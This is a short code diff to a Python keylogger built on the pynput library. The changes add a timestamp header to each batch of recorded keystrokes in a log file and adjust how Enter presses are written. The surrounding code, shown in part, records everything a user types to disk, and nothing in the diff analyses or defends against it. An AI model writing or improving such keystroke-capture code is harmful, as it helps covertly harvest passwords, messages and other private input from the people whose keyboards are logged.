@@ -1,5 +1,6 @@
 from typing import List
 import pynput
+from datetime import datetime
 
 # Define constants
 LOG_FILE = "log.txt"
@@ -29,11 +30,14 @@ def on_press(key):
 
 def write_file(keys):
     with open(LOG_FILE, "a") as f:
+        now = datetime.now()
+        date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
+        f.write(f"\n\n{date_time}\n")
         words = []
         for key in keys:
             k = str(key).replace("'", "")
             if k == "Key.enter":
-                f.write("".join(words) + "\n\n")
+                f.write("".join(words) + "\n")
                 words = []
             elif k == "Key.space":
                 words.append(" ")
